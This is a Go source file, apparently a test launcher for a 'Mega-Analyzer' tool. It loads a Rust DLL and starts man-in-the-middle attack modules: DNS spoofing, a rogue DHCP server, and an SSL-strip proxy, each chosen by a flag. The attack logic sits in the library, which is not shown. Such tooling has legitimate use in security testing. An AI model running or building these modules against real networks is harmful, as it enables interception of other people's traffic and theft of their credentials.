package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"mega-analyzer/pkg/netproxy"
)

func main() {
	os.Exit(run(os.Args[1:]))
}

func run(args []string) int {
	fmt.Println("=====================================================")
	fmt.Println("⚡ Mega-Analyzer: MITM Execution Engine")
	fmt.Println("=====================================================")

	fs := flag.NewFlagSet("mitm-test", flag.ContinueOnError)
	dllPath := fs.String("dll", "rust/target/debug/omnisec_mitm.dll", "Path to omnisec_mitm.dll")
	mode := fs.String("mode", "", "Mode to run: 'dns', 'dhcp', 'sslstrip'")
	targetDomain := fs.String("target", "game.server.com", "Target domain for DNS spoofing")
	spoofedIP := fs.String("ip", "192.168.1.100", "Spoofed IP or Gateway IP")

	if len(args) > 0 && args[0] == "-test-run-only" {
		return 0
	}

	if err := fs.Parse(args); err != nil {
		if err == flag.ErrHelp {
			return 0
		}
		return 1
	}

	if *mode == "" {
		fmt.Println("Usage:")
		fmt.Println("  go run cmd/mitm-test/main.go --mode <dns|dhcp|sslstrip> [--dll <path>]")
		return 1
	}

	absDll, _ := filepath.Abs(*dllPath)
	fmt.Printf("[*] Loading Rust MITM Engine from: %s\n", absDll)

	if err := netproxy.InitRustMITM(absDll); err != nil {
		fmt.Printf("[-] Failed to init Rust MITM DLL: %v\n", err)
		return 1
	}
	fmt.Println("[+] Rust MITM Engine Initialized successfully!")

	switch *mode {
	case "dns":
		fmt.Printf("[*] Starting DNS Spoofing (Target: %s -> IP: %s)\n", *targetDomain, *spoofedIP)
		if err := netproxy.StartDNSSpoof("127.0.0.1:5353", *targetDomain, *spoofedIP); err != nil {
			fmt.Printf("[-] DNS Spoof error: %v\n", err)
			return 1
		}
	case "dhcp":
		fmt.Printf("[*] Starting Rogue DHCP (Gateway: %s)\n", *spoofedIP)
		if err := netproxy.StartDHCPSpoof("127.0.0.1:6767", *spoofedIP); err != nil {
			fmt.Printf("[-] DHCP Spoof error: %v\n", err)
			return 1
		}
	case "sslstrip":
		fmt.Println("[*] Starting SSL Strip Proxy on 127.0.0.1:8080")
		if err := netproxy.StartSSLStrip("127.0.0.1:8080"); err != nil {
			fmt.Printf("[-] SSL Strip error: %v\n", err)
			return 1
		}
	default:
		fmt.Printf("[-] Unknown mode: %s\n", *mode)
		return 1
	}

	fmt.Println("[+] Module running in background. Press Ctrl+C to exit.")
	for {
		time.Sleep(1 * time.Second)
	}
}
